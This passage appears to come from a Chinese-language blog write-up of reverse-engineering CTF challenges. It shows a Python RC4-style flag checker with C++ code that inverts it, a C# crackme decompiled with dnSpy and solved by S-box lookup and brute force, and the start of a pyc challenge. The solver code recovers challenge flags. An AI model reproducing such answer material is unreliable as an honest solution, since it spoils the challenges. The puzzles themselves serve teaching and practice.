129, 174, 56, 190, 46, 127, 49, 43, 245, 130, 114, 34, 202, 27, 131, 224, 64, 160, 50, 153, 157, 206, 52, 91, 225, 58, 176, 14, 5, 147, 103, 12, 30, 146, 77, 61, 179, 85, 101, 71, 72, 210, 47, 253, 8, 98, 45, 7, 246, 67, 135, 18, 255, 168, 90, 139, 203, 2, 242, 32, 111, 22, 220, 102, 107, 138, 37, 169, 116, 28, 35, 156, 89, 173, 235, 185, 136, 31, 252, 29, 78, 63, 170, 25, 222, 19, 99, 44, 100, 124, 229, 144, 20, 221, 177, 232, 82, 163, 3, 249, 40, 93, 83, 68, 152, 223, 60, 54, 96, 97, 166, 94, 21, 16, 230, 154, 109, 178, 254, 92, 132, 155, 142, 1, 182, 243, 215, 197, 13, 0, 79, 151, 84, 187, 216, 180, 188, 175, 59, 66, 10, 106, 121, 183, 205, 42, 105, 204, 87, 86, 134, 189, 23, 241, 248, 118, 110, 211, 57, 158, 247, 231, 24, 218, 38, 149, 33, 15, 164, 217, 128, 115, 17, 233, 53, 236, 140, 51, 11, 208, 196, 55, 39, 172, 9, 76, 80, 226, 4, 70, 195, 108, 201, 69, 238, 123, 88, 145, 162, 125, 192, 219, 74, 161, 81, 198, 209, 73, 133, 186, 119, 251, 143, 200, 194, 171, 141, 104, 213, 113, 6, 159, 199, 167, 75, 191]</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bbbbbbbbbb</span>(<span class="hljs-params">a</span>):</span><br>    q = <span class="hljs-number">0</span><br>    w = <span class="hljs-number">0</span><br>    e = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>) :<br>        q = (q + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        w = (w + whatbox[q]) % <span class="hljs-number">256</span><br>        temp = whatbox[q]<br>        whatbox[q] = whatbox[w]<br>        whatbox[w] = temp<br>        e = (whatbox[q] + whatbox[w]) % <span class="hljs-number">256</span><br>        <span class="hljs-comment">#print(whatbox[e],end=&#x27;,&#x27;)</span><br>        a[k] = a[k] ^ whatbox[e] ^ <span class="hljs-number">102</span><br><span class="hljs-comment">#[23,104,57,207,150,242,66,87,81,213,140,172,131,48,106,172,132,173,66,76,58,116,176,222,31,6,52,221,73,137,4,186]</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ccccccccc</span>(<span class="hljs-params">a</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>) :<br>        a[i] ^= a[((i + <span class="hljs-number">1</span>) % <span class="hljs-number">32</span>)]<br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>):<br>        a[j] ^= a[(j - <span class="hljs-number">1</span>)]<br><br><br><span class="hljs-comment">#if __name__ == &#x27;__main__&#x27;:</span><br>kkkkkkk = <span class="hljs-string">&#x27;Geek2021&#x27;</span><br>tttttt = [<span class="hljs-number">117</span>, <span class="hljs-number">62</span>, <span class="hljs-number">240</span>, <span class="hljs-number">152</span>, <span class="hljs-number">195</span>, <span class="hljs-number">117</span>, <span class="hljs-number">103</span>, <span class="hljs-number">74</span>, <span class="hljs-number">240</span>, <span class="hljs-number">151</span>, <span class="hljs-number">173</span>, <span class="hljs-number">162</span>, <span class="hljs-number">17</span>, <span class="hljs-number">75</span>, <span class="hljs-number">141</span>, <span class="hljs-number">165</span>, <span class="hljs-number">136</span>, <span class="hljs-number">117</span>, <span class="hljs-number">113</span>, <span class="hljs-number">33</span>, <span class="hljs-number">98</span>, <span class="hljs-number">151</span>, <span class="hljs-number">174</span>, <span class="hljs-number">4</span>, <span class="hljs-number">48</span>, <span class="hljs-number">25</span>, <span class="hljs-number">254</span>, <span class="hljs-number">101</span>, <span class="hljs-number">185</span>, <span class="hljs-number">127</span>, <span class="hljs-number">131</span>, <span class="hljs-number">87</span>]<br>ssss = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input your flag:&#x27;</span>)<br>inp = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(ssss)<br><span class="hljs-comment">#if len(ssss) != 32:</span><br>    <span class="hljs-comment">#print(&#x27;Length Error!!!!&#x27;)</span><br>    <span class="hljs-comment">#exit(0)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ssss)):<br>    inp[i] = <span class="hljs-built_in">ord</span>(ssss[i])<br><br><span class="hljs-comment">#aaaaaaa(kkkkkkk)</span><br><span class="hljs-comment">#print(whatbox)</span><br>bbbbbbbbbb(inp)<br>ccccccccc(inp)<br><span class="hljs-comment">#for m in range(32):</span><br>    <span class="hljs-comment">#assert not tttttt[m] != inp[m], &#x27;sorry your flag is wrong&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;success!!!!!!&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;your flag is &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ssss))<br></code></pre></td></tr></table></figure><p>我写的有点乱，毕竟我的 VSCode 调试不起只能这个样子来伪调试一下，我们简易的分析可以知道这个程序是在 Rc4 的基础上多了一部分的数组操作。我们根据对应操作进行逆向回去（ C + + 代码如下 ) ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> t[]=&#123;<span class="hljs-number">23</span>,<span class="hljs-number">104</span>,<span class="hljs-number">57</span>,<span class="hljs-number">207</span>,<span class="hljs-number">150</span>,<span class="hljs-number">242</span>,<span class="hljs-number">66</span>,<span class="hljs-number">87</span>,<span class="hljs-number">81</span>,<span class="hljs-number">213</span>,<span class="hljs-number">140</span>,<span class="hljs-number">172</span>,<span class="hljs-number">131</span>,<span class="hljs-number">48</span>,<span class="hljs-number">106</span>,<span class="hljs-number">172</span>,<span class="hljs-number">132</span>,<span class="hljs-number">173</span>,<span class="hljs-number">66</span>,<span class="hljs-number">76</span>,<span class="hljs-number">58</span>,<span class="hljs-number">116</span>,<span class="hljs-number">176</span>,<span class="hljs-number">222</span>,<span class="hljs-number">31</span>,<span class="hljs-number">6</span>,<span class="hljs-number">52</span>,<span class="hljs-number">221</span>,<span class="hljs-number">73</span>,<span class="hljs-number">137</span>,<span class="hljs-number">4</span>,<span class="hljs-number">186</span>&#125;;<br><span class="hljs-keyword">int</span> ans[]=&#123;<span class="hljs-number">117</span>, <span class="hljs-number">62</span>, <span class="hljs-number">240</span>, <span class="hljs-number">152</span>, <span class="hljs-number">195</span>, <span class="hljs-number">117</span>, <span class="hljs-number">103</span>, <span class="hljs-number">74</span>, <span class="hljs-number">240</span>, <span class="hljs-number">151</span>, <span class="hljs-number">173</span>, <span class="hljs-number">162</span>, <span class="hljs-number">17</span>, <span class="hljs-number">75</span>, <span class="hljs-number">141</span>, <span class="hljs-number">165</span>, <span class="hljs-number">136</span>, <span class="hljs-number">117</span>, <span class="hljs-number">113</span>, <span class="hljs-number">33</span>, <span class="hljs-number">98</span>, <span class="hljs-number">151</span>, <span class="hljs-number">174</span>, <span class="hljs-number">4</span>, <span class="hljs-number">48</span>, <span class="hljs-number">25</span>, <span class="hljs-number">254</span>, <span class="hljs-number">101</span>, <span class="hljs-number">185</span>, <span class="hljs-number">127</span>, <span class="hljs-number">131</span>, <span class="hljs-number">87</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">31</span>;i&gt;=<span class="hljs-number">1</span>;i--)&#123;<br>ans[i]^=ans[i<span class="hljs-number">-1</span>];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j =<span class="hljs-number">31</span>;j&gt;=<span class="hljs-number">0</span>;j--)&#123;<br>ans[j]^=ans[(j+<span class="hljs-number">1</span>)%<span class="hljs-number">32</span>];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> n=<span class="hljs-number">0</span>;n&lt;<span class="hljs-number">32</span>;n++)&#123;<br>ans[n]=ans[n]^t[n]^<span class="hljs-number">102</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> m=<span class="hljs-number">0</span>;m&lt;<span class="hljs-number">32</span>;m++)&#123;<br>cout&lt;&lt;(<span class="hljs-keyword">char</span>)ans[m];<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>运行代码之后我们便可以得到对应的 flag。</p><h3 id="new-language"><strong>new_language</strong></h3><p>我们根据提示拿到对应题目的信息可以知道这个是一个 C# 的反编译，我们安装对应程序 dnSpy 将程序拖入便可以得到对应的反编译代码，我们找到对应的主函数进行分析 ：</p><p><img src="https://static01.imgkr.com/temp/d8b0f96af38048208d051174d868c4d2.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/2c7c79f7f69046a09e53f60b81c218f5.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/3e7291ad8b594e00aa6658608bb876ec.png" alt=""></p><p>通过简单的分析，我们可以看到程序对输入的字符转换成 int 类型，并通过异或和与运算进行了乱序的排列并与 arry2 里面的数据进行比较，我们逆向回去的的话需要将原来的数据所在的位置找到，再对其进行分析代码如下 ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> num1[] = &#123; <span class="hljs-number">64</span>,<span class="hljs-number">249</span>,<span class="hljs-number">133</span>,<span class="hljs-number">69</span>,<span class="hljs-number">146</span>,<span class="hljs-number">253</span>,<span class="hljs-number">253</span>,<span class="hljs-number">207</span>,<span class="hljs-number">182</span>,<span class="hljs-number">4</span>,<span class="hljs-number">157</span>,<span class="hljs-number">207</span>,<span class="hljs-number">251</span>,<span class="hljs-number">4</span>,<span class="hljs-number">60</span>,<span class="hljs-number">81</span>,<span class="hljs-number">59</span>,<span class="hljs-number">77</span>,<span class="hljs-number">146</span>,<span class="hljs-number">77</span>,<span class="hljs-number">207</span>,<span class="hljs-number">26</span>,<span class="hljs-number">38</span>,<span class="hljs-number">207</span>,<span class="hljs-number">64</span>,<span class="hljs-number">77</span>,<span class="hljs-number">177</span>,<span class="hljs-number">77</span>,<span class="hljs-number">64</span>,<span class="hljs-number">195</span>,<span class="hljs-number">77</span>,<span class="hljs-number">253</span>,<span class="hljs-number">253</span> &#125;;<br><span class="hljs-keyword">int</span> dir[]=&#123; <br><span class="hljs-number">99</span>,<br><span class="hljs-number">124</span>,<br><span class="hljs-number">119</span>,<br><span class="hljs-number">123</span>,<br><span class="hljs-number">242</span>,<br><span class="hljs-number">107</span>,<br><span class="hljs-number">111</span>,<br><span class="hljs-number">197</span>,<br><span class="hljs-number">48</span>,<br><span class="hljs-number">1</span>,<br><span class="hljs-number">103</span>,<br><span class="hljs-number">43</span>,<br><span class="hljs-number">254</span>,<br><span class="hljs-number">215</span>,<br><span class="hljs-number">171</span>,<br><span class="hljs-number">118</span>,<br><span class="hljs-number">202</span>,<br><span class="hljs-number">130</span>,<br><span class="hljs-number">201</span>,<br><span class="hljs-number">125</span>,<br><span class="hljs-number">250</span>,<br><span class="hljs-number">89</span>,<br><span class="hljs-number">71</span>,<br><span class="hljs-number">240</span>,<br><span class="hljs-number">173</span>,<br><span class="hljs-number">212</span>,<br><span class="hljs-number">162</span>,<br><span class="hljs-number">175</span>,<br><span class="hljs-number">156</span>,<br><span class="hljs-number">164</span>,<br><span class="hljs-number">114</span>,<br><span class="hljs-number">192</span>,<br><span class="hljs-number">183</span>,<br><span class="hljs-number">253</span>,<br><span class="hljs-number">147</span>,<br><span class="hljs-number">38</span>,<br><span class="hljs-number">54</span>,<br><span class="hljs-number">63</span>,<br><span class="hljs-number">247</span>,<br><span class="hljs-number">204</span>,<br><span class="hljs-number">52</span>,<br><span class="hljs-number">165</span>,<br><span class="hljs-number">229</span>,<br><span class="hljs-number">241</span>,<br><span class="hljs-number">113</span>,<br><span class="hljs-number">216</span>,<br><span class="hljs-number">49</span>,<br><span class="hljs-number">21</span>,<br><span class="hljs-number">4</span>,<br><span class="hljs-number">199</span>,<br><span class="hljs-number">35</span>,<br><span class="hljs-number">195</span>,<br><span class="hljs-number">24</span>,<br><span class="hljs-number">150</span>,<br><span class="hljs-number">5</span>,<br><span class="hljs-number">154</span>,<br><span class="hljs-number">7</span>,<br><span class="hljs-number">18</span>,<br><span class="hljs-number">128</span>,<br><span class="hljs-number">226</span>,<br><span class="hljs-number">235</span>,<br><span class="hljs-number">39</span>,<br><span class="hljs-number">178</span>,<br><span class="hljs-number">117</span>,<br><span class="hljs-number">9</span>,<br><span class="hljs-number">131</span>,<br><span class="hljs-number">44</span>,<br><span class="hljs-number">26</span>,<br><span class="hljs-number">27</span>,<br><span class="hljs-number">110</span>,<br><span class="hljs-number">90</span>,<br><span class="hljs-number">160</span>,<br><span class="hljs-number">82</span>,<br><span class="hljs-number">59</span>,<br><span class="hljs-number">214</span>,<br><span class="hljs-number">179</span>,<br><span class="hljs-number">41</span>,<br><span class="hljs-number">227</span>,<br><span class="hljs-number">47</span>,<br><span class="hljs-number">132</span>,<br><span class="hljs-number">83</span>,<br><span class="hljs-number">209</span>,<br><span class="hljs-number">0</span>,<br><span class="hljs-number">237</span>,<br><span class="hljs-number">32</span>,<br><span class="hljs-number">252</span>,<br><span class="hljs-number">177</span>,<br><span class="hljs-number">91</span>,<br><span class="hljs-number">106</span>,<br><span class="hljs-number">203</span>,<br><span class="hljs-number">190</span>,<br><span class="hljs-number">57</span>,<br><span class="hljs-number">74</span>,<br><span class="hljs-number">76</span>,<br><span class="hljs-number">88</span>,<br><span class="hljs-number">207</span>,<br><span class="hljs-number">208</span>,<br><span class="hljs-number">239</span>,<br><span class="hljs-number">170</span>,<br><span class="hljs-number">251</span>,<br><span class="hljs-number">67</span>,<br><span class="hljs-number">77</span>,<br><span class="hljs-number">51</span>,<br><span class="hljs-number">133</span>,<br><span class="hljs-number">69</span>,<br><span class="hljs-number">249</span>,<br><span class="hljs-number">2</span>,<br><span class="hljs-number">127</span>,<br><span class="hljs-number">80</span>,<br><span class="hljs-number">60</span>,<br><span class="hljs-number">159</span>,<br><span class="hljs-number">168</span>,<br><span class="hljs-number">81</span>,<br><span class="hljs-number">163</span>,<br><span class="hljs-number">64</span>,<br><span class="hljs-number">143</span>,<br><span class="hljs-number">146</span>,<br><span class="hljs-number">157</span>,<br><span class="hljs-number">56</span>,<br><span class="hljs-number">245</span>,<br><span class="hljs-number">188</span>,<br><span class="hljs-number">182</span>,<br><span class="hljs-number">218</span>,<br><span class="hljs-number">33</span>,<br><span class="hljs-number">16</span>,<br><span class="hljs-number">255</span>,<br><span class="hljs-number">243</span>,<br><span class="hljs-number">210</span>,<br><span class="hljs-number">205</span>,<br><span class="hljs-number">12</span>,<br><span class="hljs-number">19</span>,<br><span class="hljs-number">236</span>,<br><span class="hljs-number">95</span>,<br><span class="hljs-number">151</span>,<br><span class="hljs-number">68</span>,<br><span class="hljs-number">23</span>,<br><span class="hljs-number">196</span>,<br><span class="hljs-number">167</span>,<br><span class="hljs-number">126</span>,<br><span class="hljs-number">61</span>,<br><span class="hljs-number">100</span>,<br><span class="hljs-number">93</span>,<br><span class="hljs-number">25</span>,<br><span class="hljs-number">115</span>,<br><span class="hljs-number">96</span>,<br><span class="hljs-number">129</span>,<br><span class="hljs-number">79</span>,<br><span class="hljs-number">220</span>,<br><span class="hljs-number">34</span>,<br><span class="hljs-number">42</span>,<br><span class="hljs-number">144</span>,<br><span class="hljs-number">136</span>,<br><span class="hljs-number">70</span>,<br><span class="hljs-number">238</span>,<br><span class="hljs-number">184</span>,<br><span class="hljs-number">20</span>,<br><span class="hljs-number">222</span>,<br><span class="hljs-number">94</span>,<br><span class="hljs-number">11</span>,<br><span class="hljs-number">219</span>,<br><span class="hljs-number">224</span>,<br><span class="hljs-number">50</span>,<br><span class="hljs-number">58</span>,<br><span class="hljs-number">10</span>,<br><span class="hljs-number">73</span>,<br><span class="hljs-number">6</span>,<br><span class="hljs-number">36</span>,<br><span class="hljs-number">92</span>,<br><span class="hljs-number">194</span>,<br><span class="hljs-number">211</span>,<br><span class="hljs-number">172</span>,<br><span class="hljs-number">98</span>,<br><span class="hljs-number">145</span>,<br><span class="hljs-number">149</span>,<br><span class="hljs-number">228</span>,<br><span class="hljs-number">121</span>,<br><span class="hljs-number">231</span>,<br><span class="hljs-number">200</span>,<br><span class="hljs-number">55</span>,<br><span class="hljs-number">109</span>,<br><span class="hljs-number">141</span>,<br><span class="hljs-number">213</span>,<br><span class="hljs-number">78</span>,<br><span class="hljs-number">169</span>,<br><span class="hljs-number">108</span>,<br><span class="hljs-number">86</span>,<br><span class="hljs-number">244</span>,<br><span class="hljs-number">234</span>,<br><span class="hljs-number">101</span>,<br><span class="hljs-number">122</span>,<br><span class="hljs-number">174</span>,<br><span class="hljs-number">8</span>,<br><span class="hljs-number">186</span>,<br><span class="hljs-number">120</span>,<br><span class="hljs-number">37</span>,<br><span class="hljs-number">46</span>,<br><span class="hljs-number">28</span>,<br><span class="hljs-number">166</span>,<br><span class="hljs-number">180</span>,<br><span class="hljs-number">198</span>,<br><span class="hljs-number">232</span>,<br><span class="hljs-number">221</span>,<br><span class="hljs-number">116</span>,<br><span class="hljs-number">31</span>,<br><span class="hljs-number">75</span>,<br><span class="hljs-number">189</span>,<br><span class="hljs-number">139</span>,<br><span class="hljs-number">138</span>,<br><span class="hljs-number">112</span>,<br><span class="hljs-number">62</span>,<br><span class="hljs-number">181</span>,<br><span class="hljs-number">102</span>,<br><span class="hljs-number">72</span>,<br><span class="hljs-number">3</span>,<br><span class="hljs-number">246</span>,<br><span class="hljs-number">14</span>,<br><span class="hljs-number">97</span>,<br><span class="hljs-number">53</span>,<br><span class="hljs-number">87</span>,<br><span class="hljs-number">185</span>,<br><span class="hljs-number">134</span>,<br><span class="hljs-number">193</span>,<br><span class="hljs-number">29</span>,<br><span class="hljs-number">158</span>,<br><span class="hljs-number">225</span>,<br><span class="hljs-number">248</span>,<br><span class="hljs-number">152</span>,<br><span class="hljs-number">17</span>,<br><span class="hljs-number">105</span>,<br><span class="hljs-number">217</span>,<br><span class="hljs-number">142</span>,<br><span class="hljs-number">148</span>,<br><span class="hljs-number">155</span>,<br><span class="hljs-number">30</span>,<br><span class="hljs-number">135</span>,<br><span class="hljs-number">233</span>,<br><span class="hljs-number">206</span>,<br><span class="hljs-number">85</span>,<br><span class="hljs-number">40</span>,<br><span class="hljs-number">223</span>,<br><span class="hljs-number">140</span>,<br><span class="hljs-number">161</span>,<br><span class="hljs-number">137</span>,<br><span class="hljs-number">13</span>,<br><span class="hljs-number">191</span>,<br><span class="hljs-number">230</span>,<br><span class="hljs-number">66</span>,<br><span class="hljs-number">104</span>,<br><span class="hljs-number">65</span>,<br><span class="hljs-number">153</span>,<br><span class="hljs-number">45</span>,<br><span class="hljs-number">15</span>,<br><span class="hljs-number">176</span>,<br><span class="hljs-number">84</span>,<br><span class="hljs-number">187</span>,<br><span class="hljs-number">22</span><br>&#125;; <span class="hljs-comment">//太长了不想去删空格</span><br><span class="hljs-keyword">int</span> des[<span class="hljs-number">33</span>];<br><br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">33</span>; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; j++) &#123;<br><span class="hljs-keyword">if</span> (dir[j] == num1[i]) &#123;<br>des[i] = j;<span class="hljs-comment">//记录对应数据的位置</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">33</span>; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">127</span>; j++) &#123;  <span class="hljs-comment">//爆破范围一般在 0-127 就可以了，对应的ASCii都是可以显示出来的  </span><br><span class="hljs-keyword">if</span> (((j &gt;&gt; <span class="hljs-number">4</span>) * <span class="hljs-number">16</span> + (j &amp; <span class="hljs-string">&#x27;\u000f&#x27;</span>)) == des[i]) &#123;<br>cout &lt;&lt; (<span class="hljs-keyword">char</span>)j;<span class="hljs-comment">//对数据进行爆破</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>运行程序便可以得到对应的 flag 。</p><h3 id="珍惜生命"><strong>珍惜生命</strong></h3><p>我们拿到手的是一份 pyc 我们对其进行反编译成 py ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 